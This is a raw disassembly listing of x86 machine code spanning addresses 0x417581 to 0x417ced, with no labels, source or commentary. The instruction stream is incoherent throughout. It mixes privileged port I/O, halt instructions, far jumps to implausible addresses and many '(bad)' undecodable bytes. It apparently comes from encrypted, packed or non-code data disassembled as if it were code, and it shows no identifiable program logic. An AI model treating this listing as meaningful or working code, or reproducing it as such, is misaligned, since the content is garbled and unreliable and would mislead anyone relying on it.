  417581:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417582:	retf   
  417583:	cwde   
  417584:	dec    ebp
  417585:	lds    esi,FWORD PTR [esi]
  417587:	adc    bl,0x96
  41758a:	xchg   edi,eax
  41758b:	inc    edx
  41758c:	rcr    eax,cl
  41758e:	dec    esp
  41758f:	pop    ecx
  417590:	sbb    al,0x7b
  417592:	add    DWORD PTR [edx+0x1],esp
  417595:	js     0x4175b1
  417597:	cld    
  417598:	push   edx
  417599:	push   esp
  41759a:	in     eax,dx
  41759b:	jae    0x4175c3
  41759d:	jne    0x417571
  41759f:	in     eax,dx
  4175a0:	popa   
  4175a1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4175a2:	hlt    
  4175a3:	push   ecx
  4175a4:	inc    ecx
  4175a5:	push   ds
  4175a6:	mov    dh,0x80
  4175a8:	hlt    
  4175a9:	xchg   esp,eax
  4175aa:	push   0xb2396f0f
  4175af:	mov    WORD PTR [edx+0x52],gs
  4175b2:	sub    cl,BYTE PTR [edx-0x26]
  4175b5:	xchg   ebx,eax
  4175b6:	or     BYTE PTR [edx],0x1b
  4175b9:	arpl   WORD PTR [edi],sp
  4175bb:	call   0xad216772
  4175c0:	imul   edx,DWORD PTR [eax+0x58],0xffffffb4
  4175c4:	pop    es
  4175c5:	inc    esi
  4175c6:	out    dx,eax
  4175c7:	xor    DWORD PTR [esi+ebp*4],edx
  4175ca:	xchg   ebp,eax
  4175cb:	mov    eax,0x2d0e6095
  4175d0:	test   al,0x50
  4175d2:	lea    esp,[eax]
  4175d4:	push   es
  4175d5:	loopne 0x41759d
  4175d7:	mov    WORD PTR [eax-0x30715f1],?
  4175dd:	das    
  4175de:	pop    esp
  4175df:	xchg   ebx,eax
  4175e0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4175e1:	rcr    dl,1
  4175e3:	add    bh,BYTE PTR [ecx-0xa]
  4175e6:	push   ebp
  4175e7:	shl    ah,1
  4175e9:	popa   
  4175ea:	test   DWORD PTR [eax],eax
  4175ec:	gs push ss
  4175ee:	fldcw  WORD PTR [eax-0x64486add]
  4175f4:	loope  0x417649
  4175f6:	and    DWORD PTR [esi+0x5],edi
  4175f9:	sub    dl,BYTE PTR [ecx-0x7e]
  4175fc:	jmp    0xc0230e34
  417601:	mov    bl,0x82
  417603:	dec    edx
  417604:	pop    ds
  417605:	bound  esp,QWORD PTR [eax]
  417607:	sub    eax,0xf85551a5
  41760c:	and    cl,BYTE PTR [ecx]
  41760e:	imul   esp,edi,0x3c526fa
  417614:	mov    ds:0xdcb3e6e,eax
  417619:	pop    edi
  41761a:	lods   al,BYTE PTR ds:[esi]
  41761b:	mov    ah,0x32
  41761d:	(bad)  
  41761e:	shl    edi,1
  417620:	add    ch,BYTE PTR [ebx-0x77]
  417623:	fdivrp st(0),st
  417625:	ret    
  417626:	pop    edx
  417627:	xchg   edi,eax
  417628:	test   BYTE PTR [ecx+ebx*4],al
  41762b:	ret    
  41762c:	in     eax,0x24
  41762e:	gs test eax,0xc295bcfd
  417634:	(bad)  
  417635:	mov    cl,0x16
  417637:	btc    DWORD PTR [edi*1+0x1ed46b17],0xe8
  417640:	pop    eax
  417641:	into   
  417642:	loop   0x41761f
  417644:	sahf   
  417645:	pop    esp
  417646:	and    ch,BYTE PTR [edi+0x55]
  417649:	cmp    BYTE PTR [ebp-0x7ab6a8d2],dl
  41764f:	xchg   ebx,eax
  417650:	sub    eax,0xb0220a6c
  417655:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417656:	dec    edx
  417657:	xchg   ecx,eax
  417658:	fs cli 
  41765a:	(bad)  
  41765b:	ins    BYTE PTR es:[edi],dx
  41765c:	adc    ebp,DWORD PTR ds:0x79708531
  417662:	mov    ebx,0xe7e2e2c1
  417667:	fstp   st(7)
  417669:	dec    ebx
  41766a:	mov    bl,0xb2
  41766c:	lds    ebx,FWORD PTR ds:0x9f9b6763
  417672:	jecxz  0x417604
  417674:	inc    eax
  417675:	xor    al,0x20
  417677:	jecxz  0x417689
  417679:	inc    ebx
  41767a:	jo     0x417615
  41767c:	push   edx
  41767d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41767e:	adc    esp,DWORD PTR [ebp-0x17]
  417681:	aaa    
  417682:	inc    esp
  417683:	enter  0x151e,0x4a
  417687:	pop    esp
  417689:	mov    ecx,0xc050ec36
  41768e:	sahf   
  41768f:	ja     0x4176e0
  417691:	jnp    0x417675
  417693:	(bad)  
  417695:	pop    esp
  417696:	aas    
  417697:	mov    ds:0x20205c7,eax
  41769c:	stc    
  41769d:	push   ebp
  41769e:	loopne 0x41767d
  4176a0:	(bad)
  4176a4:	ficom  DWORD PTR [eax-0x80]
  4176a7:	pop    esi
  4176a8:	sbb    esp,DWORD PTR [eax+0x1b]
  4176ab:	fst    st(4)
  4176ad:	and    BYTE PTR [bx-0x5044],dh
  4176b2:	pop    eax
  4176b3:	or     BYTE PTR [eax-0x250e8d72],ah
  4176b9:	nop
  4176ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4176bb:	nop
  4176bc:	lea    esp,[esi-0x1e]
  4176bf:	ins    DWORD PTR es:[di],dx
  4176c1:	cmp    BYTE PTR [ecx-0x995b0b],dl
  4176c7:	jae    0x417708
  4176c9:	loop   0x4176ee
  4176cb:	pop    ds
  4176cc:	mov    ah,0x46
  4176ce:	jo     0x417652
  4176d0:	(bad)  
  4176d1:	sub    al,0xd7
  4176d3:	stc    
  4176d4:	xchg   edi,eax
  4176d5:	aam    0x83
  4176d7:	out    dx,al
  4176d8:	fbld   TBYTE PTR [ebx]
  4176da:	jmp    0x83cdda5f
  4176df:	stos   BYTE PTR es:[edi],al
  4176e0:	cmc    
  4176e1:	call   0x81c1:0xd6109c74
  4176e8:	rcl    BYTE PTR [eax+0x63],1
  4176eb:	dec    esp
  4176ec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4176ed:	adc    DWORD PTR [edx+0x5b],eax
  4176f0:	inc    ebx
  4176f1:	xor    al,0x27
  4176f3:	retf   
  4176f4:	jbe    0x41771a
  4176f6:	and    edx,DWORD PTR [esi+0x67]
  4176f9:	and    BYTE PTR [edi],bh
  4176fb:	sar    al,1
  4176fd:	in     al,0xd8
  4176ff:	xchg   edi,eax
  417700:	xchg   edx,eax
  417701:	rcr    BYTE PTR [ebx-0x666704fb],cl
  417707:	stos   BYTE PTR es:[edi],al
  417708:	pop    edi
  417709:	cmp    ch,BYTE PTR [edi-0x61646b3c]
  41770f:	inc    esi
  417710:	inc    esp
  417711:	inc    esp
  417712:	jecxz  0x4176d4
  417714:	sbb    esp,DWORD PTR [ebx+0x131530e2]
  41771a:	push   cs
  41771b:	retw   
  41771d:	(bad)  
  41771e:	out    dx,eax
  41771f:	lds    eax,FWORD PTR [esp+edi*8+0xf]
  417723:	ins    DWORD PTR es:[edi],dx
  417724:	mov    ds:0xb65cbe01,al
  417729:	out    dx,al
  41772a:	sub    eax,0xaaf75123
  41772f:	pop    edi
  417730:	and    ebp,DWORD PTR [esi]
  417732:	adc    eax,0xb119b7ce
  417737:	or     ecx,edx
  417739:	outs   dx,BYTE PTR ds:[esi]
  41773a:	imul   edi,DWORD PTR [eax],0x1f
  41773d:	inc    edi
  41773e:	in     eax,0x30
  417740:	cli    
  417741:	mov    ch,0x4c
  417743:	pop    esi
  417744:	jle    0x417778
  417746:	inc    edi
  417747:	aas    
  417748:	dec    ebx
  417749:	inc    esp
  41774b:	pop    ecx
  41774c:	loope  0x4177bf
  41774e:	mov    al,0xe5
  417750:	cmp    al,0x64
  417752:	push   esi
  417753:	mov    cl,ah
  417755:	mov    ebp,0x6578e890
  41775a:	dec    edx
  41775b:	mov    ch,BYTE PTR [ecx-0x63]
  41775e:	sbb    eax,0xe08385c4
  417763:	xchg   esp,eax
  417764:	add    DWORD PTR [esi+0x44],0x54223f25
  41776b:	add    al,BYTE PTR [eax+0x46505415]
  417771:	adc    al,0x41
  417773:	add    bh,dh
  417775:	xor    BYTE PTR [edi],ch
  417777:	xchg   ebx,eax
  417778:	cmovbe esp,DWORD PTR [eax*2+0x2520a009]
  417780:	mov    edi,0xd73f8851
  417785:	mul    ebx
  417787:	sbb    BYTE PTR [edi+eax*4],ah
  41778a:	jp     0x417747
  41778c:	popa   
  41778d:	add    BYTE PTR [ebp-0x16],ah
  417790:	loop   0x417760
  417792:	outs   dx,BYTE PTR ds:[esi]
  417793:	fwait
  417794:	sub    ebx,DWORD PTR [eax]
  417796:	popf   
  417797:	pop    edi
  417798:	in     al,0x79
  41779a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41779b:	jle    0x41774a
  41779d:	inc    edi
  41779e:	and    al,0xe0
  4177a0:	xor    BYTE PTR [ebp-0x3049eaee],cl
  4177a6:	pop    edi
  4177a7:	jge    0x41775f
  4177a9:	in     eax,dx
  4177aa:	aaa    
  4177ab:	or     esp,esi
  4177ad:	arpl   WORD PTR [esi],sp
  4177af:	mov    BYTE PTR [ecx+0x5daf90d6],dh
  4177b5:	jmp    0xb162:0xe2818a08
  4177bc:	xchg   edx,eax
  4177bd:	(bad)  
  4177be:	out    dx,al
  4177bf:	outs   dx,DWORD PTR ds:[esi]
  4177c0:	retf   
  4177c1:	iret   
  4177c2:	divps  xmm5,XMMWORD PTR [ecx+0x59c77ff1]
  4177c9:	jns    0x4177e0
  4177cb:	ficom  WORD PTR [ebx]
  4177cd:	stc    
  4177ce:	adc    eax,0x38872f7
  4177d3:	sahf   
  4177d4:	popf   
  4177d5:	(bad)  
  4177d6:	cmc    
  4177d7:	je     0x4177d2
  4177d9:	mov    DWORD PTR [ebx],esi
  4177db:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4177dc:	test   DWORD PTR fs:[edx+esi*2],esi
  4177e0:	pusha  
  4177e1:	loop   0x417781
  4177e3:	xchg   DWORD PTR [ebp+0x456cca5e],ebp
  4177e9:	dec    edi
  4177ea:	jle    0x41785f
  4177ec:	xor    BYTE PTR [esi+ebp*4],0xad
  4177f0:	cmp    ebp,edx
  4177f2:	mov    bh,0x11
  4177f4:	loope  0x41780d
  4177f6:	shl    ch,cl
  4177f8:	ins    BYTE PTR es:[edi],dx
  4177f9:	xchg   ecx,eax
  4177fa:	push   0x61edd263
  4177ff:	push   ebp
  417801:	push   ebx
  417802:	lea    ecx,[eax]
  417804:	data16 data16 ds xor al,0x8
  417809:	imul   DWORD PTR [ebx]
  41780b:	add    al,0x75
  41780d:	test   BYTE PTR [esi],al
  41780f:	mov    cl,0xa8
  417811:	and    esp,edi
  417813:	lds    esp,FWORD PTR [ecx-0x60]
  417816:	mov    bh,0xb0
  417818:	(bad)  
  417819:	clc    
  41781a:	xor    ebp,eax
  41781c:	rcl    BYTE PTR [ebx+0x4a],1
  41781f:	xchg   BYTE PTR [edx],ah
  417821:	repnz xchg ecx,eax
  417823:	push   ebp
  417824:	loopne 0x4177ff
  417826:	lds    ebp,FWORD PTR [ecx+eax*4]
  417829:	sbb    cl,0x44
  41782c:	sub    DWORD PTR [eax-0x73],0xffffffed
  417830:	inc    ecx
  417831:	ins    DWORD PTR es:[edi],dx
  417832:	stos   BYTE PTR es:[edi],al
  417833:	mov    al,0x97
  417835:	push   ebx
  417836:	rol    BYTE PTR [edx+0x1d],1
  417839:	outs   dx,DWORD PTR ds:[esi]
  41783a:	xchg   ebp,eax
  41783b:	push   esi
  41783c:	out    dx,eax
  41783d:	mov    DWORD PTR [edx],ebp
  41783f:	outs   dx,BYTE PTR ds:[esi]
  417840:	pop    ebp
  417841:	mov    ebp,DWORD PTR [esp+ebx*1-0x6467c19]
  417848:	jne    0x4178ae
  41784a:	mov    ebp,0xaa7c97a4
  41784f:	jmp    0xefb5c630
  417854:	fmul   DWORD PTR [eax-0x4a]
  417857:	push   es
  417858:	pop    eax
  417859:	mov    es,WORD PTR [ecx]
  41785b:	push   cs
  41785c:	adc    ebp,DWORD PTR [ebx+0x46]
  41785f:	jmp    0x39b10da4
  417864:	or     al,0xe9
  417866:	retf   
  417867:	sbb    DWORD PTR [ecx+0x57d48fd0],ebp
  41786d:	jb     0x4177f2
  41786f:	mov    ah,0xbc
  417871:	and    al,0xcd
  417873:	(bad)  
  417875:	test   al,0xbc
  417877:	inc    edx
  417878:	xchg   ebx,eax
  417879:	jns    0x417815
  41787b:	mov    edx,0xb9a8ec20
  417880:	mov    dh,0x59
  417882:	loope  0x4178b1
  417884:	outs   dx,BYTE PTR ds:[esi]
  417885:	jne    0x4178e4
  417887:	shr    cl,cl
  417889:	popf   
  41788a:	pop    edi
  41788b:	mov    ecx,0x87a4df57
  417890:	iret   
  417891:	add    ebp,DWORD PTR [ebx-0x4c7b6cb4]
  417897:	sub    DWORD PTR [edx],esi
  417899:	push   cs
  41789a:	dec    ebp
  41789b:	int    0x8b
  41789d:	pop    edx
  41789e:	aad    0x7c
  4178a0:	and    eax,0x52e4b624
  4178a5:	mov    eax,ds:0xb88fcbe4
  4178aa:	fld    QWORD PTR [ecx+eiz*4+0x23ce8a44]
  4178b1:	imul   edi,edi,0x2110cb60
  4178b7:	fprem1 
  4178b9:	sbb    al,bl
  4178bb:	int3   
  4178bc:	and    BYTE PTR [esi-0x5d],bl
  4178bf:	xlat   BYTE PTR ds:[ebx]
  4178c0:	mov    ds:0x6881ebd1,eax
  4178c5:	mov    BYTE PTR [edi+0x7f],ch
  4178c8:	pop    eax
  4178c9:	aam    0x1c
  4178cb:	test   BYTE PTR [edx],bl
  4178cd:	jl     0x417862
  4178cf:	inc    eax
  4178d0:	dec    ebp
  4178d1:	xor    esp,DWORD PTR [esp+ecx*1+0x5c]
  4178d5:	adc    eax,0x44117fcf
  4178da:	(bad)  
  4178db:	aad    0x4b
  4178dd:	add    dl,BYTE PTR [ecx-0x1]
  4178e0:	js     0x41786b
  4178e2:	aam    0x8f
  4178e4:	in     al,dx
  4178e5:	pop    edx
  4178e6:	aas    
  4178e7:	mov    esp,0x23dea0d3
  4178ec:	outs   dx,BYTE PTR ds:[esi]
  4178ed:	rcl    DWORD PTR [eax+esi*1+0x25],0x4d
  4178f2:	pusha  
  4178f3:	inc    esp
  4178f4:	aas    
  4178f5:	push   0x67
  4178f7:	mov    esi,ss
  4178f9:	mov    edi,0xaf26420c
  4178fe:	xor    al,0xdf
  417900:	mov    cl,BYTE PTR [edi+0x5f]
  417903:	ret    0x339f
  417906:	adc    eax,0x9bbca360
  41790b:	ret    
  41790c:	mov    cl,0x92
  41790e:	adc    dl,BYTE PTR [eax+0x60]
  417911:	pop    ecx
  417912:	xchg   esp,eax
  417913:	das    
  417914:	adc    DWORD PTR [esi+0x74669a5a],esi
  41791a:	mov    DWORD PTR [edi-0x568bdc59],0x350dc89e
  417924:	mov    al,ds:0x18f6ebea
  417929:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41792a:	mov    ebx,0xda3f69
  41792f:	aas    
  417930:	xrelease mov DWORD PTR [eax+0x502abf38],edx
  417937:	inc    ebx
  417938:	sbb    cl,0xd8
  41793b:	sbb    ecx,ebx
  41793d:	xor    eax,0xc91f7b4b
  417942:	xlat   BYTE PTR ds:[ebx]
  417943:	fimul  DWORD PTR [esi]
  417945:	dec    ebp
  417946:	jl     0x4178d6
  417948:	aad    0xe1
  41794a:	mov    ds:0xe4c94ff5,al
  41794f:	std    
  417950:	and    eax,0x63eca34
  417955:	adc    eax,DWORD PTR [ebx-0x40a9a1e9]
  41795b:	mov    eax,0x74f66348
  417960:	inc    ebx
  417961:	xchg   esp,eax
  417962:	mov    WORD PTR [ecx-0x57],ss
  417965:	mov    ds:0x40a6dbf1,al
  41796a:	push   0xf841423a
  41796f:	pop    es
  417970:	push   es
  417971:	arpl   di,bx
  417973:	int3   
  417974:	inc    ebp
  417975:	jecxz  0x41790d
  417977:	cld    
  417978:	push   ebx
  417979:	add    DWORD PTR [eax],edi
  41797b:	cmp    DWORD PTR [ecx],0x9b92e63b
  417981:	cmp    ebx,DWORD PTR [esp+eiz*8-0x18b11689]
  417988:	in     eax,0xd
  41798a:	dec    edi
  41798b:	lods   eax,DWORD PTR ds:[esi]
  41798c:	cwde   
  41798d:	xchg   edi,ecx
  41798f:	sbb    bh,BYTE PTR [ebp+0x35f482ae]
  417995:	scas   eax,DWORD PTR es:[edi]
  417996:	mov    ecx,0x93f55732
  41799b:	imul   BYTE PTR [ebx+0x15b2b18]
  4179a1:	arpl   WORD PTR [esi+ebp*4-0x30ccf9e6],sp
  4179a8:	add    BYTE PTR [esi-0x38],dl
  4179ab:	sub    edx,edx
  4179ad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4179ae:	shr    DWORD PTR [ebp-0xc],cl
  4179b1:	jge    0x417995
  4179b3:	fld    QWORD PTR [edx-0x70]
  4179b6:	dec    esi
  4179b7:	xchg   esi,eax
  4179b8:	mov    dl,0x70
  4179ba:	in     al,0x84
  4179bc:	call   0x75e10f1
  4179c1:	jns    0x4179c3
  4179c3:	or     BYTE PTR [edx+0x57588e],dh
  4179c9:	lods   al,BYTE PTR ds:[esi]
  4179ca:	outs   dx,DWORD PTR ds:[esi]
  4179cb:	dec    ebx
  4179cc:	rol    BYTE PTR [edx-0x80],0xfb
  4179d0:	mov    al,0xda
  4179d2:	addr16 dec ebp
  4179d4:	clc    
  4179d5:	or     BYTE PTR [ebx],0x83
  4179d8:	xchg   ebp,eax
  4179d9:	add    DWORD PTR [edi+0x7f756385],ebx
  4179df:	mov    ecx,0x3f4e501f
  4179e4:	enter  0xb9ee,0xd5
  4179e8:	dec    esi
  4179e9:	cld    
  4179ea:	inc    eax
  4179eb:	jg     0x417a41
  4179ed:	ret    
  4179ee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4179ef:	push   ds
  4179f0:	and    al,BYTE PTR [eax-0x744bd784]
  4179f6:	push   eax
  4179f7:	loope  0x4179fc
  4179f9:	jo     0x4179c8
  4179fb:	push   eax
  4179fc:	rol    DWORD PTR [edi],1
  4179fe:	fnstcw WORD PTR [esi]
  417a00:	dec    eax
  417a01:	xlat   BYTE PTR ds:[ebx]
  417a02:	jecxz  0x417a03
  417a04:	test   DWORD PTR [eax],edx
  417a06:	sahf   
  417a07:	fmul   QWORD PTR [edx]
  417a09:	pushf  
  417a0a:	sub    edi,0x7aa0dfdc
  417a10:	add    edx,DWORD PTR [ebp+0x44]
  417a13:	loop   0x417a1c
  417a15:	call   0xc128:0x8fdab3aa
  417a1c:	or     DWORD PTR [ecx+ebp*1-0x63d197bc],eax
  417a23:	mov    bl,0x2f
  417a25:	sub    bl,BYTE PTR ss:[ebp+0x22f0bfbc]
  417a2c:	and    edi,DWORD PTR [ecx+0x31905c98]
  417a32:	stos   BYTE PTR es:[edi],al
  417a33:	push   0x4d9b969e
  417a38:	add    BYTE PTR [edi+eiz*1-0x24],dl
  417a3c:	mov    esi,0x97c6a36e
  417a41:	push   ebx
  417a42:	lahf   
  417a43:	lahf   
  417a44:	and    DWORD PTR [eax+ebp*4-0x790f1140],eax
  417a4b:	je     0x417a4f
  417a4d:	ins    DWORD PTR es:[edi],dx
  417a4e:	mov    al,ds:0xa58d3c90
  417a53:	and    BYTE PTR [ecx],al
  417a55:	js     0x417acb
  417a57:	test   al,0x4c
  417a59:	(bad)  
  417a5a:	mov    dl,0x3f
  417a5c:	outs   dx,BYTE PTR ds:[esi]
  417a5d:	cmp    DWORD PTR [eax-0x4066a138],ecx
  417a63:	hlt    
  417a64:	jmp    0x417a28
  417a66:	fdivr  st(7),st
  417a68:	sbb    eax,0x21c7201c
  417a6d:	mov    edi,0x56f9b16b
  417a72:	fwait
  417a73:	push   DWORD PTR [esi]
  417a75:	cmp    dl,cl
  417a77:	loopne 0x417adc
  417a79:	loope  0x417a96
  417a7b:	mov    ebx,0xdbd41104
  417a80:	cmp    ebp,DWORD PTR [edi]
  417a82:	(bad)  
  417a83:	jmp    0xb17f7591
  417a88:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417a89:	mov    dh,0x39
  417a8b:	push   0x3b20f5dd
  417a90:	mov    eax,ds:0x570f6d3b
  417a95:	dec    esp
  417a96:	and    cl,al
  417a98:	scas   eax,DWORD PTR es:[edi]
  417a99:	inc    ebp
  417a9a:	fcomp  QWORD PTR cs:[ebx-0x30b6c24a]
  417aa1:	dec    ecx
  417aa2:	xchg   ebp,eax
  417aa3:	cmp    edi,eax
  417aa5:	push   ebx
  417aa6:	into   
  417aa7:	jbe    0x417ab9
  417aa9:	push   ebx
  417aaa:	sub    DWORD PTR [esi-0x62],0xffffffbf
  417aae:	xor    eax,0xfd7d93
  417ab3:	mov    ds:0x1380ff24,al
  417ab8:	push   ecx
  417ab9:	inc    ebx
  417aba:	jb     0x417b0d
  417abc:	scas   al,BYTE PTR es:[edi]
  417abd:	xchg   edi,eax
  417abe:	mov    dl,BYTE PTR [ecx-0x6bb9bd97]
  417ac4:	shl    bl,1
  417ac6:	jmp    0x6d8017ff
  417acb:	inc    edi
  417acc:	pusha  
  417acd:	dec    ecx
  417ace:	das    
  417acf:	cs cmp dl,al
  417ad2:	jnp    0x417ac2
  417ad4:	mul    dl
  417ad6:	rcl    DWORD PTR [eax],0x2f
  417ad9:	mov    ds:0x19d2ccf,eax
  417ade:	mov    al,ds:0x707fbd8c
  417ae3:	mov    ch,0x8f
  417ae5:	mov    al,0x40
  417ae7:	fwait
  417ae8:	mov    bl,0xe5
  417aea:	cmp    BYTE PTR [eax-0x65],dh
  417aed:	pusha  
  417aee:	jns    0x417b29
  417af0:	scas   eax,DWORD PTR es:[edi]
  417af1:	cwde   
  417af2:	jb     0x417ab3
  417af4:	fidivr DWORD PTR [ecx+0x341a8623]
  417afa:	hlt    
  417afb:	xor    al,BYTE PTR [edi]
  417afd:	test   al,0xd2
  417aff:	outs   dx,BYTE PTR ds:[esi]
  417b00:	(bad)  
  417b01:	mov    bh,0x9f
  417b03:	ss retf 
  417b05:	and    bh,BYTE PTR [ecx-0x4a4120d6]
  417b0b:	cmp    esi,DWORD PTR [ecx+0x57]
  417b0e:	push   cs
  417b0f:	push   cs
  417b10:	fs xor eax,0x3808c3c9
  417b16:	dec    esp
  417b17:	jbe    0x417ae8
  417b19:	push   es
  417b1a:	aas    
  417b1b:	scas   al,BYTE PTR es:[edi]
  417b1c:	lahf   
  417b1d:	mov    dl,0x92
  417b1f:	lds    ecx,FWORD PTR [esi+edi*4+0x47]
  417b23:	aam    0xf0
  417b25:	sub    eax,0xfe51aac
  417b2a:	sbb    ebx,DWORD PTR [edx+0x7ef91b3c]
  417b30:	inc    ebp
  417b31:	mov    ecx,0x1a204795
  417b36:	pop    ss
  417b37:	pop    edi
  417b38:	cmp    BYTE PTR [eax+0x7c],al
  417b3b:	and    DWORD PTR [edx],edx
  417b3d:	(bad)  
  417b3e:	xchg   edi,eax
  417b3f:	mov    cl,0x14
  417b41:	(bad)  
  417b42:	jb     0x417ad0
  417b44:	xchg   edi,eax
  417b45:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417b46:	lahf   
  417b47:	stos   DWORD PTR es:[edi],eax
  417b48:	sahf   
  417b49:	pop    edi
  417b4a:	in     al,0x3
  417b4c:	push   0x7b
  417b4e:	mov    cl,0xe3
  417b50:	mov    ah,0x65
  417b52:	mov    esi,0x329d6abe
  417b57:	adc    BYTE PTR [esp+eax*1],dl
  417b5a:	or     al,0x82
  417b5c:	loope  0x417b29
  417b5e:	mov    esi,0x196bcf8e
  417b63:	ins    BYTE PTR es:[edi],dx
  417b64:	fisubr DWORD PTR [ebx]
  417b66:	aad    0xbf
  417b68:	cmp    ebp,DWORD PTR [ecx+eax*1+0x38264276]
  417b6f:	push   es
  417b70:	loopne 0x417b9a
  417b72:	scas   al,BYTE PTR es:[edi]
  417b73:	std    
  417b74:	ins    DWORD PTR es:[edi],dx
  417b75:	js     0x417b80
  417b77:	ja     0x417b75
  417b79:	nop
  417b7a:	out    dx,eax
  417b7b:	inc    ebx
  417b7c:	push   0xc5346b6a
  417b81:	jmp    0x81667a0b
  417b86:	icebp  
  417b87:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417b88:	out    dx,al
  417b89:	xlat   BYTE PTR ds:[ebx]
  417b8a:	push   0x31
  417b8c:	jb     0x417bac
  417b8e:	rcl    DWORD PTR [edi+0x60],cl
  417b91:	ds sub al,0xa
  417b94:	push   esi
  417b95:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417b96:	dec    edi
  417b97:	push   es
  417b98:	push   esp
  417b99:	sub    BYTE PTR [ecx],bh
  417b9b:	push   edi
  417b9c:	stos   DWORD PTR es:[edi],eax
  417b9d:	xlat   BYTE PTR ds:[ebx]
  417b9e:	add    BYTE PTR [edx+0x7fe80c80],cl
  417ba4:	(bad)  
  417ba5:	clc    
  417ba6:	xlat   BYTE PTR ds:[ebx]
  417ba7:	push   ebp
  417ba8:	mov    DWORD PTR [eax],0x899afbb1
  417bae:	clc    
  417baf:	sbb    edi,DWORD PTR [ebp+0x420aba8b]
  417bb5:	pusha  
  417bb6:	sub    dl,dh
  417bb8:	ja     0x417b89
  417bba:	out    0x3c,al
  417bbc:	out    0x8e,al
  417bbe:	jns    0x417c03
  417bc0:	loope  0x417b59
  417bc2:	pop    edi
  417bc3:	pop    eax
  417bc4:	addr16 mov ah,0x95
  417bc7:	gs leave 
  417bc9:	ror    esp,1
  417bcb:	fimul  DWORD PTR [edi]
  417bcd:	dec    edx
  417bce:	out    dx,eax
  417bcf:	jecxz  0x417bbb
  417bd1:	cld    
  417bd2:	das    
  417bd3:	sbb    al,0x68
  417bd5:	popa   
  417bd6:	jnp    0x417b73
  417bd8:	mov    cl,0x69
  417bda:	in     eax,dx
  417bdb:	jl     0x417c32
  417bdd:	cmp    bl,BYTE PTR [edx+0x4eeccab8]
  417be3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417be4:	dec    edx
  417be5:	pop    eax
  417be6:	sbb    eax,DWORD PTR [ebx+0x4d6f979e]
  417bec:	sbb    BYTE PTR [eax-0x6e78b60d],cl
  417bf2:	repnz test DWORD PTR [edi+esi*1+0x52],0x7cf3c9d5
  417bfb:	add    BYTE PTR [edi-0xa],ch
  417bfe:	jp     0x417c32
  417c00:	repz push edx
  417c02:	add    edi,esi
  417c04:	test   ebx,ecx
  417c06:	jno    0x417c2e
  417c08:	dec    eax
  417c09:	enter  0x776d,0x87
  417c0d:	jns    0x417c05
  417c0f:	mov    ebp,0x3c4ef3c0
  417c14:	or     ch,ch
  417c16:	and    DWORD PTR [eax-0x97f7559],0xffffff93
  417c1d:	adc    eax,DWORD PTR [eax-0x7809f697]
  417c23:	fmul   QWORD PTR [ebx-0x10341059]
  417c29:	mov    bh,0x10
  417c2b:	lea    edi,[ebx-0xa]
  417c2e:	add    al,0x6c
  417c30:	imul   ecx,edx,0x64
  417c33:	leave  
  417c34:	rcl    dl,0x47
  417c37:	mov    edx,0x3178a0f4
  417c3c:	retf   0xd674
  417c3f:	fwait
  417c40:	pop    ecx
  417c41:	and    bl,ah
  417c43:	mov    dh,0xf3
  417c45:	stc    
  417c46:	sub    ecx,edx
  417c48:	adc    ecx,DWORD PTR [ebx]
  417c4a:	add    eax,0xec72af67
  417c4f:	clc    
  417c50:	add    DWORD PTR [ebp-0x23],0xeb1ca0d
  417c57:	sahf   
  417c58:	push   esp
  417c59:	mov    al,0x72
  417c5b:	mov    ebx,0xbe76162b
  417c60:	cmp    dl,0xa5
  417c63:	pop    ebx
  417c64:	(bad)  
  417c65:	pop    edx
  417c66:	jl     0x417cdf
  417c68:	inc    esi
  417c69:	add    DWORD PTR [edx-0x64],esp
  417c6c:	dec    ebp
  417c6d:	cli    
  417c6e:	sbb    ebx,ebp
  417c70:	cmp    DWORD PTR [ecx],edi
  417c72:	repz adc al,0xc5
  417c75:	or     DWORD PTR [edi-0x2d],edi
  417c78:	mov    esp,0x273fc150
  417c7d:	scas   al,BYTE PTR es:[edi]
  417c7e:	cmp    ch,BYTE PTR ds:0xaa5b346d
  417c84:	xchg   esi,eax
  417c85:	mov    esp,0xbf8c7d21
  417c8a:	lods   eax,DWORD PTR ds:[esi]
  417c8b:	in     al,dx
  417c8c:	pushf  
  417c8d:	jmp    0xff4227bd
  417c92:	mov    ecx,edx
  417c94:	mov    cl,0x7b
  417c96:	dec    ebp
  417c97:	and    BYTE PTR [esi-0x79],al
  417c9a:	rcl    DWORD PTR [esi-0x2],cl
  417c9d:	icebp  
  417c9e:	imul   edx,DWORD PTR [esi-0x58124c2d],0x1a6f2a70
  417ca8:	xor    eax,0xd4fba13e
  417cad:	or     al,0x6b
  417caf:	mov    edx,0xb921bd9f
  417cb4:	adc    DWORD PTR [ecx+0x50],esp
  417cb7:	sub    DWORD PTR [esi+esi*4-0x353080c1],ebp
  417cbe:	imul   edi,DWORD PTR [ebp+0x5981d760],0xfffffff9
  417cc5:	cmp    BYTE PTR [edx+eiz*2+0x2fe8c01f],al
  417ccc:	repnz int3 
  417cce:	pop    ebp
  417ccf:	stos   DWORD PTR es:[edi],eax
  417cd0:	sbb    ah,cl
  417cd2:	in     eax,dx
  417cd3:	fst    DWORD PTR [ecx]
  417cd5:	push   cs
  417cd6:	imul   ebp,DWORD PTR [esp+edi*4+0x4b61d0bd],0xffffffd6
  417cde:	test   ecx,ecx
  417ce0:	fwait
  417ce1:	stos   DWORD PTR es:[edi],eax
  417ce2:	xchg   esi,eax
  417ce3:	sub    DWORD PTR [ecx],ebp
  417ce5:	hlt    
  417ce6:	cmp    esp,DWORD PTR [ebx]
  417ce8:	mov    esi,0xbf3bbae8
  417ced:	mov    al,0xa9
